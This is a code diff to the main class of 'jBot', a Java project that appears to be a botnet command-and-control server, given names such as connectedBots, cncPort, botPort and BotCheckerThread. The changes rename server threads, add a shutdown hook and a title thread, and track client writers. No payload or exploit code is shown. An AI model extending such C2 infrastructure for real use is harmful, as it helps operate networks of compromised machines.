@@ -6,15 +6,16 @@ import me.aaronakhtar.jbot.file_manager.config_files.DefaultConfigurationFile;
 import me.aaronakhtar.jbot.file_manager.files.AccessKeysFile;
 import me.aaronakhtar.jbot.objects.Bot;
 import me.aaronakhtar.jbot.threads.BotCheckerThread;
-import me.aaronakhtar.jbot.threads.BotServer;
-import me.aaronakhtar.jbot.threads.ClientServer;
+import me.aaronakhtar.jbot.threads.DynamicTitleThread;
+import me.aaronakhtar.jbot.threads.ShutdownThread;
+import me.aaronakhtar.jbot.threads.servers.BotServerThread;
+import me.aaronakhtar.jbot.threads.servers.ClientServerThread;
 import org.reflections.Reflections;
 
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.net.Socket;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Map;
-import java.util.Set;
+import java.util.*;
 
 public class Main {
 
@@ -22,12 +23,12 @@ public class Main {
         System.out.println(Utilities.Colour.GREEN.get() + "\nDeveloped by Aaron Akhtar \n\n");  // excuse my promo ;P
     }
 
-    public static final Map<String, Object> defaultConfig = ConfigFile.getProperties(new DefaultConfigurationFile());
-    public static final List<Bot>           connectedBots = new ArrayList<>();
-    public static final List<Socket>        connectedClients = new ArrayList<>();
-    public static volatile boolean          isRunning = true;                       //todo create 'switch' to modify this value.
-    public static final String              name = "jBot";
-    public static final String              encryptionKey = defaultConfig.get("encryption-key").toString();
+    public static final Map<String, Object>         defaultConfig = ConfigFile.getProperties(new DefaultConfigurationFile());
+    public static final List<Bot>                   connectedBots = new ArrayList<>();
+    public static final Map<Socket, BufferedWriter> connectedClients = new HashMap<>();
+    public static volatile boolean                  isRunning = true;                       //todo create 'switch' to modify this value.
+    public static final String                      name = "jBot";
+    public static final String                      encryptionKey = defaultConfig.get("encryption-key").toString();
 
 
     public static final Set<Class<? extends ConfigFile>> configFiles = new Reflections("me.aaronakhtar.jbot.file_manager.files")
@@ -35,7 +36,6 @@ public class Main {
 
     public static final Set<Class<? extends JBotCommand>> commands = new Reflections("me.aaronakhtar.jbot.command_manager.commands")
             .getSubTypesOf(JBotCommand.class);
-
 
     public static void main(String[] args) {
 
@@ -54,10 +54,11 @@ public class Main {
                     Utilities.handleException(e);
                 }
             }
-
+            Runtime.getRuntime().addShutdownHook(new Thread(new ShutdownThread()));
             Utilities.sendInternalMessage("Fetched ["+AccessKeysFile.getAccessKeys().size()+"] Access-Keys...");
-            new ClientServer(cncPort).start();
-            new BotServer(botPort).start();
+            new ClientServerThread(cncPort).start();
+            new BotServerThread(botPort).start();
+            new DynamicTitleThread().start();
 
             new BotCheckerThread().start();
 
